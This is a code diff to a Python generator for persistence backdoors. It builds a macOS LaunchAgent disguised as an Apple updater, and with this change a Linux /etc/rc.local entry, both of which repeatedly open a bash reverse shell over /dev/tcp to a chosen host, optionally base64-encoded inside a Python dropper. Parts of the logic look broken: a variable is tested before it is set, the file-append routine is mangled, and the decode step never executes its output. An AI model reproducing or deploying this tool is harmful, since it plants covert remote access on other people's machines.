@@ -23,6 +23,10 @@ color = {
     'MAGENTA'         : '\033[0;35m',
 }
 
+yes = ['Y', 'y', 'Ye', 'ye', 'YE', 'Yes', 'yes', 'YES']
+
+no  = ['N', 'n', 'No', 'no', 'NO']
+
 def getip():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -37,7 +41,19 @@ def printY(strs):
     sys.stdout.write(color['YELLOW'] + strs[0])
     sys.stdout.write(color['RED'] + strs[1] + '\n')
 
+def append(filepath, string):
+    temp = list()
+    with open(filepath, 'r') as file:
+        for line in file:
+            temp += line
+
+    temp = '\n'.join(temp)
+    with open(filepath, 'w') as file:
+        file.write(string)
+        file.write(temp)
+
 def main():
+    global yes, no
     print(color['GREEN'])
     sys.stdout.softspace = False;
     printY( ["  _____       ", " _____        __          _   "] )
@@ -71,31 +87,66 @@ def main():
 
     encode = get_input(color['CYAN'] + "Encode to Base64? [Y/N]: " + color['GREEN'])
     print()
-
-    yes = ['Y', 'y', 'Ye', 'ye', 'YE', 'Yes', 'yes', 'YES']
-    no  = ['N', 'n', 'No', 'no', 'NO']
-
-    command = '''mkdir -p ~/Library/LaunchAgents || true;echo "<?xml version="1.0" encoding="UTF-8"?>
-    <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-    <plist version="1.0">
-    <dict>
-        <key>Label</key>
-        <string>com.zerowidth.launched.appleupdater</string>
-        <key>ProgramArguments</key>
-        <array>
-            <string>sh</string>
-            <string>-c</string>
-            <string>bash &amp;&gt; /dev/tcp/''' + hostChoice + '''/''' + portChoice + ''' 0&gt;&amp;1</string>
-        </array>
-        <key>RunAtLoad</key>
-        <true/>
-        <key>StartInterval</key>
-        <integer>''' + interval + '''.0</integer>
-    </dict>
-    </plist>
     
-    " >> ~/Library/LaunchAgents/com.zerowidth.launched.appleupdater.plist || true;launchctl load -w ~/Library/LaunchAgents/com.zerowidth.launched.appleupdater.plist || true'''
+    while not OS in [1,2]:
+        print("Choose a target OS:")
+        print()
+        print("1) OS X")
+        print("2) Linux\n")
+        OS = get_input("OS Choice [1,2]: ")
 
+    if OS == "2":
+        command = "while sleep " + interval + "; do bash &> /dev/tcp/" + hostChoice + "/" + portChoice + " 0>&1; done"
+        
+        if encode in yes:
+            encoded = base64.b64encode(command)
+            append("/etc/rc.local","echo " + encoded + "| base64 -D" + "\n")
+        
+        elif encode in no:
+            append("/etc/rc.local", "\n")
+    
+    elif OS == "1":
+        command = '''mkdir -p ~/Library/LaunchAgents || true;echo "<?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        <plist version="1.0">
+        <dict>
+            <key>Label</key>
+            <string>com.zerowidth.launched.appleupdater</string>
+            <key>ProgramArguments</key>
+            <array>
+                <string>sh</string>
+                <string>-c</string>
+                <string>bash &amp;&gt; /dev/tcp/''' + hostChoice + '''/''' + portChoice + ''' 0&gt;&amp;1</string>
+            </array>
+            <key>RunAtLoad</key>
+            <true/>
+            <key>StartInterval</key>
+            <integer>''' + interval + '''.0</integer>
+        </dict>
+        </plist>
+        
+        " >> ~/Library/LaunchAgents/com.zerowidth.launched.appleupdater.plist || true;launchctl load -w ~/Library/LaunchAgents/com.zerowidth.launched.appleupdater.plist || true'''
+        
+    if encode in yes:
+        encoded = base64.b64encode(command)
+        
+        file = open(filename,"w")
+        file.write('import os\n')
+        file.write('import sys\n\n')
+        file.write('os.system("echo '+encoded+' | base64 -D")\n')
+        file.close()
+    
+    elif encode in no:
+        file = open(filename,"w")
+        file.write('import os\n')
+        file.write('import sys\n\n')
+        file.write('os.system("""' + command + '""")')
+        file.close()
+    
+    else:
+        print(color['RED'] + "Error: Invalid choice." + color['WHITE'])
+        os._exit(1)
+        
     if encode in yes:
         encoded = base64.b64encode(command)
         
